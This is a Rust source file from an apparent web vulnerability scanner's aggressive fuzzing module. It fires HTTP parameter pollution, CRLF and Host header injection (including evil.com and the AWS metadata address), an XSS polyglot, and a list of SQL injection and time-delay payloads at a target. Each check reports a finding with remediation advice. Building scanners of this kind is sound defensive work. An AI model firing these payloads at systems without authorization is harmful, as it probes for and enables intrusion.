use crate::core::HttpClient;
use crate::models::{Finding, Severity, Confidence};
use crate::utils;
use std::collections::HashMap;

/// Aggressive fuzzing checks — HTTP Parameter Pollution, CRLF, Host header, hidden params
pub async fn run_aggressive_fuzzing(
    client: &HttpClient,
    url: &str,
    baseline_body: &str,
    baseline_headers: &HashMap<String, String>,
) -> Vec<Finding> {
    let mut findings = Vec::new();

    findings.extend(check_http_parameter_pollution(client, url, baseline_body, baseline_headers).await);
    findings.extend(check_crlf_injection(client, url, baseline_headers).await);
    findings.extend(check_host_header_injection(client, url, baseline_body).await);
    findings.extend(check_hidden_parameters(client, url, baseline_body).await);
    findings.extend(check_polyglot_injection(client, url, baseline_body).await);

    findings
}

// ── HTTP Parameter Pollution (HPP) ──

async fn check_http_parameter_pollution(
    client: &HttpClient,
    url: &str,
    baseline_body: &str,
    _baseline_headers: &HashMap<String, String>,
) -> Vec<Finding> {
    let mut findings = Vec::new();
    let params = extract_params_from_url(url);

    for param in params.iter().take(5) {
        // HPP: duplicate the same parameter
        let hpp_url = duplicate_param(url, &param, &format!("{}_hpp", param));
        match client.fetch_url(&hpp_url).await {
            Ok(response) => {
                if let Some(ref body) = response.body {
                    // Check if server concatenated or reflected both values
                    if body.contains(&format!("{}_hpp", param)) {
                        findings.push(Finding::new(
                            "fuzzer-hpp",
                            "HTTP Parameter Pollution (HPP) — server reflects duplicate params",
                            Severity::Medium,
                            format!("Parameter '{}' was duplicated and both values were processed. HPP can bypass WAF rules and alter application logic.", param),
                            format!("URL: {}\nDuplicate param '{}' reflected in response", hpp_url, param),
                            "Use the last occurrence of a parameter. Validate all parameter values before processing.",
                            &hpp_url,
                        ).with_confidence(Confidence::High));
                    }

                    // Check for WAF bypass: size difference suggests different processing
                    if let Some(ref base) = Some(baseline_body) {
                        let size_diff = (body.len() as i64 - base.len() as i64).abs();
                        if size_diff > 200 {
                            findings.push(Finding::new(
                                "fuzzer-hpp",
                                "HPP caused response size change (possible WAF bypass)",
                                Severity::Medium,
                                format!("Duplicate '{}' parameter changed response by {} bytes. May indicate different processing path (WAF bypass).", param, size_diff),
                                format!("URL: {}\nSize delta: {} bytes", hpp_url, size_diff),
                                "Configure WAF to inspect all parameter occurrences.",
                                &hpp_url,
                            ).with_confidence(Confidence::Low));
                        }
                    }
                }
            }
            Err(_) => continue,
        }
    }

    findings
}

fn duplicate_param(url: &str, param: &str, extra_value: &str) -> String {
    if url.contains('?') {
        format!("{}&{}={}", url, param, extra_value)
    } else {
        format!("{}?{}={}", url, param, extra_value)
    }
}

// ── CRLF / Header Injection ──

async fn check_crlf_injection(
    client: &HttpClient,
    url: &str,
    baseline_headers: &HashMap<String, String>,
) -> Vec<Finding> {
    let mut findings = Vec::new();

    // Test injecting via query parameter into response headers
    let crlf_payloads = [
        ("%0d%0aX-Offsec-Injected:%20true", "CRLF in query"),
        ("%0d%0aSet-Cookie:%20offsec=injected", "CRLF Set-Cookie injection"),
        ("\\r\\nX-Offsec:%20test", "CRLF escaped"),
    ];

    for (payload, label) in &crlf_payloads {
        let test_url = if url.contains('?') {
            format!("{}&crlf={}", url, payload)
        } else {
            format!("{}?crlf={}", url, payload)
        };

        match client.fetch_url(&test_url).await {
            Ok(response) => {
                // Check if our injected header appeared
                if response.headers.contains_key("x-offsec-injected")
                    || response.headers.contains_key("set-cookie")
                    && response.headers.get("set-cookie").map_or(false, |v| v.contains("offsec=injected"))
                {
                    findings.push(Finding::new(
                        "fuzzer-crlf",
                        format!("CRLF injection: {} — HTTP response splitting", label),
                        Severity::Critical,
                        format!("CRLF payload '{}' injected a new HTTP header. This enables HTTP response splitting, cache poisoning, and XSS via header injection.", payload),
                        format!("URL: {}\nInjected header detected in response", test_url),
                        "Sanitize all user input before including in HTTP headers. Strip CR/LF characters.",
                        &test_url,
                    ).with_confidence(Confidence::Confirmed));
                }
            }
            Err(_) => continue,
        }
    }

    // Also check for header reflection in common params
    for param in &["url", "redirect", "return", "next", "callback", "ref", "origin"] {
        let test_url = if url.contains('?') {
            format!("{}&{}=https://evil.com/%0d%0aX-Offsec:injected", url, param)
        } else {
            format!("{}?{}=https://evil.com/%0d%0aX-Offsec:injected", url, param)
        };

        match client.send_custom_request_with_header("GET", &test_url, "X-Test", "offsec").await {
            Ok(response) => {
                if response.headers.contains_key("x-offsec") {
                    findings.push(Finding::new(
                        "fuzzer-crlf",
                        format!("CRLF injection via '{}' parameter — header reflected", param),
                        Severity::Critical,
                        format!("Parameter '{}' reflects CRLF-injected headers. This enables HTTP response splitting attacks.", param),
                        format!("URL: {}\nInjected header 'X-Offsec' appeared in response", test_url),
                        "Sanitize redirect/callback parameters. Use URL whitelists.",
                        &test_url,
                    ).with_confidence(Confidence::Confirmed));
                }
            }
            Err(_) => continue,
        }
    }

    let _ = baseline_headers;
    findings
}

// ── Host Header Injection ──

async fn check_host_header_injection(
    client: &HttpClient,
    url: &str,
    baseline_body: &str,
) -> Vec<Finding> {
    let mut findings = Vec::new();

    let test_hosts = [
        ("evil.com", "Arbitrary Host header"),
        ("127.0.0.1", "Localhost Host header"),
        ("169.254.169.254", "AWS metadata Host header"),
    ];

    for (host, label) in &test_hosts {
        match client.send_custom_request_with_header("GET", url, "Host", host).await {
            Ok(response) => {
                if let Some(ref body) = response.body {
                    // Check if host is reflected in page (password reset poisoning)
                    if body.contains(host) {
                        // Check if it appears in links or scripts (actionable)
                        let link_re = regex::Regex::new(&format!(r#"https?://{}"#, host)).unwrap();
                        let link_count = link_re.find_iter(body).count();

                        if link_count > 0 {
                            findings.push(Finding::new(
                                "fuzzer-host",
                                format!("Host header injection: {} — reflected in {} links", label, link_count),
                                Severity::High,
                                format!("Host header '{}' is reflected in {} links/scripts. This enables password reset poisoning, cache poisoning, and redirect attacks.", host, link_count),
                                format!("URL: {}\nHost header '{}' reflected", url, host),
                                "Use absolute URLs or a whitelist of allowed hosts. Configure the web server to validate the Host header.",
                                url,
                            ).with_confidence(Confidence::Confirmed));
                        } else {
                            findings.push(Finding::new(
                                "fuzzer-host",
                                format!("Host header reflected: {}", label),
                                Severity::Medium,
                                format!("Host header '{}' is reflected in the response body.", host),
                                format!("URL: {}\nHost: {}", url, host),
                                "Validate the Host header against a whitelist.",
                                url,
                            ).with_confidence(Confidence::Medium));
                        }
                    }

                    // Check for redirect to our host
                    if response.status_code >= 300 && response.status_code < 400 {
                        if let Some(location) = response.headers.get("location") {
                            if location.contains(host) {
                                findings.push(Finding::new(
                                    "fuzzer-host",
                                    format!("Host header injection causes redirect to {}", host),
                                    Severity::Critical,
                                    format!("Changing Host to '{}' causes a redirect to attacker-controlled domain. This enables open redirect and phishing attacks.", host),
                                    format!("URL: {}\nLocation: {}", url, location),
                                    "Never use the Host header in redirect URLs. Use a whitelist.",
                                    url,
                                ).with_confidence(Confidence::Confirmed));
                            }
                        }
                    }
                }
            }
            Err(_) => continue,
        }
    }

    let _ = baseline_body;
    findings
}

// ── Hidden Parameter Discovery ──

async fn check_hidden_parameters(
    client: &HttpClient,
    url: &str,
    baseline_body: &str,
) -> Vec<Finding> {
    let mut findings = Vec::new();

    // Curated list of highest-value hidden params (reduced for speed)
    let common_params = [
        "debug", "test", "admin", "dev", "backup", "old",
        "view", "mode", "lang", "format", "return", "callback",
        "jsonp", "raw", "download", "proxy", "wsdl",
    ];

    let baseline_len = baseline_body.len();
    let mut found_params = Vec::new();

    for param in &common_params {
        let test_url = if url.contains('?') {
            format!("{}&{}=1", url, param)
        } else {
            format!("{}?{}=1", url, param)
        };

        match client.fetch_url(&test_url).await {
            Ok(response) => {
                if let Some(ref body) = response.body {
                    let size_diff = (body.len() as i64 - baseline_len as i64).abs();
                    if size_diff > 50 {
                        found_params.push((param.to_string(), size_diff));
                    }
                }
            }
            Err(_) => continue,
        }
    }

    if found_params.len() >= 3 {
        found_params.sort_by_key(|(_, s)| -*s);
        let top: Vec<String> = found_params.iter().take(10)
            .map(|(p, s)| format!("{} ({}b diff)", p, s))
            .collect();

        findings.push(Finding::new(
            "fuzzer-params",
            "Hidden parameters discovered via fuzzing",
            Severity::Medium,
            format!("{} hidden parameters were discovered by testing common names. These may expose debug functionality, different views, or unprotected admin features.", found_params.len()),
            format!("Discovered: {}", top.join(", ")),
            "Review and remove or protect debug/hidden parameters. Implement access control on all parameters.",
            url,
        ).with_confidence(Confidence::Low));
    }

    findings
}

// ── Polyglot Injection ──

async fn check_polyglot_injection(
    client: &HttpClient,
    url: &str,
    baseline_body: &str,
) -> Vec<Finding> {
    let mut findings = Vec::new();

    // XSS polyglot — works in multiple contexts
    let polyglot = "jaVasCript:/*-/*`/*\\`/*'/*\"/**/(/* */offsecXSS=1)//</style/<sVg/<sVg/oNloAd=confirm(1)//>\\x3e";

    let test_url = if url.contains('?') {
        format!("{}&q={}", url, urlencoding(&polyglot))
    } else {
        format!("{}?q={}", url, urlencoding(&polyglot))
    };

    match client.fetch_url(&test_url).await {
        Ok(response) => {
            if let Some(ref body) = response.body {
                if body.contains("offsecXSS=1") {
                    let diff = utils::diff::diff_responses(
                        baseline_body, body, 0, 0,
                        &HashMap::new(), &HashMap::new(),
                        "offsecXSS=1",
                    );

                    let conf = utils::diff::confidence_from_diff(&diff);

                    findings.push(Finding::new(
                        "fuzzer-xss",
                        "XSS polyglot payload reflected — multi-context injection possible",
                        Severity::Critical,
                        format!("A polyglot XSS payload was reflected in the response ({} reflection points). Context: {:?}",
                            diff.reflection_points.len(),
                            diff.reflection_points.first().map(|p| format!("{:?}", p.context_type))),
                        format!("URL: {}\nPolyglot marker reflected", test_url),
                        "Implement strict CSP and context-aware output encoding. Use template engines with auto-escaping.",
                        &test_url,
                    ).with_confidence(conf));
                }
            }
        }
        Err(_) => {}
    }

    // Aggressive SQLi — stacked queries + bypass techniques
    let sqli_payloads = [
        ("1'/**/OR/**/1=1--", "MySQL comment bypass"),
        ("1' OR 1=1--", "Basic OR injection"),
        ("1' AND 1=1--", "AND true test"),
        ("1' AND 1=2--", "AND false test"),
        ("1' UNION SELECT NULL--", "UNION SELECT probe"),
        ("1' UNION SELECT NULL,NULL--", "UNION SELECT 2 cols"),
        ("1' UNION SELECT NULL,NULL,NULL--", "UNION SELECT 3 cols"),
        ("1'; SELECT SLEEP(2)--", "Stacked query MySQL"),
        ("1'; WAITFOR DELAY '0:0:2'--", "Stacked query MSSQL"),
        ("1'; SELECT pg_sleep(2)--", "Stacked query PostgreSQL"),
    ];

    for (payload, label) in &sqli_payloads {
        let test_url = if url.contains('?') {
            format!("{}&q={}", url, urlencoding(payload))
        } else {
            format!("{}?q={}", url, urlencoding(payload))
        };

        let start = std::time::Instant::now();
        match client.fetch_url(&test_url).await {
            Ok(response) => {
                let elapsed = start.elapsed().as_millis();
                if let Some(ref body) = response.body {
                    let body_lower = body.to_lowercase();
                    let err_patterns = [
                        "sql syntax", "mysql_fetch", "mysql error", "ora-",
                        "postgresql", "sqlite", "pdoexception", "unclosed quotation",
                        "microsoft ole db", "odbc", "sqlsrv",
                    ];
                    for pattern in &err_patterns {
                        if body_lower.contains(pattern) {
                            findings.push(Finding::new(
                                "fuzzer-sqli",
                                format!("SQL injection: {} — '{}' pattern detected", label, pattern),
                                Severity::Critical,
                                format!("Payload '{}' triggered SQL error pattern '{}'.", payload, pattern),
                                format!("URL: {}\nPayload: {}\nPattern: {}", test_url, payload, pattern),
                                "Use parameterized queries / prepared statements.",
                                &test_url,
                            ).with_confidence(Confidence::High));
                            break;
                        }
                    }
                    // Timing-based detection
                    if elapsed > 1500 {
                        findings.push(Finding::new(
                            "fuzzer-sqli",
                            format!("SQL injection timing: {} — {}ms delay", label, elapsed),
                            Severity::Critical,
                            format!("Payload '{}' caused {}ms delay, suggesting SQL execution.", payload, elapsed),
                            format!("URL: {}\nPayload: {}\nTime: {}ms", test_url, payload, elapsed),
                            "Use parameterized queries.",
                            &test_url,
                        ).with_confidence(Confidence::Low));
                    }
                }
            }
            Err(_) => continue,
        }
    }

    findings
}

fn urlencoding(s: &str) -> String {
    url::form_urlencoded::byte_serialize(s.as_bytes()).collect()
}

fn extract_params_from_url(url: &str) -> Vec<String> {
    if let Ok(parsed) = url::Url::parse(url) {
        parsed.query_pairs().map(|(k, _)| k.to_string()).collect()
    } else {
        vec![]
    }
}
